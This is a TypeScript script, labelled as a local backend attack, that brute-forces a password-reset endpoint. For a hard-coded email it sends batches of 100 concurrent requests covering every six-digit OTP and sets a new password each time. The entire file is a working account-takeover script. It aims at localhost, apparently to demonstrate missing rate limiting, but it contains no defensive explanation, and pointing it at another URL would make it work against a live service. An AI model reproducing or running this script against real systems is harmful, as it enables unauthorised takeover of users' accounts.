 /*POSTMAN METHOD FOR A LOCAL BACKEND ATTACK */

import axios from "axios";
 
//function to send a request to the server
async function sendRequest(otp: number) {
  let data = JSON.stringify({
    "email": "vishal@gmail.com",
    "otp": otp.toString(),
    "newPassword": "123123123"
  });

  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: { 
      'Content-Type': 'application/json'
    },
    data: data
  };

  try {
    await axios.request(config)
    console.log("done for " + otp);
  } catch (e) {
    //console.log('Error: ', e);
  }
}

//calling the function in a loop to send multiple requests
async function main() {
  for (let i = 0; i < 1000000; i += 100) {
    const batch_array = [];
    console.log(i);

    //sending in a batch of 100 requests
    for (let j = 0; j < 100; j++) {
      batch_array.push(sendRequest(i + j))
    }
    await Promise.all(batch_array); //wait for all requests in this batch to complete only then conitinue to the next batch
  }
}

main();